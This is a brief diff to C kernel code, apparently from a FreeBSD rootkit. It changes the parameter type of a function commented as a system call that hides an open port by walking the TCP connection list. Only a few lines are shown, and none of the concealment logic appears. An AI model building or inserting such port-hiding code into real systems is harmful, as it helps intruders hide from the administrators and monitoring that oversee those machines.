@@ -65,7 +65,7 @@ static int iterate_hash(u_int16_t lport){
 */
 
 /* System call to hide an open port. */
-int port_hiding(u_int16_t lport) {
+int port_hiding(int lport) {
 
     INP_INFO_WLOCK(&tcbinfo);
     /* Iterate through the TCP-based inpcb list. */
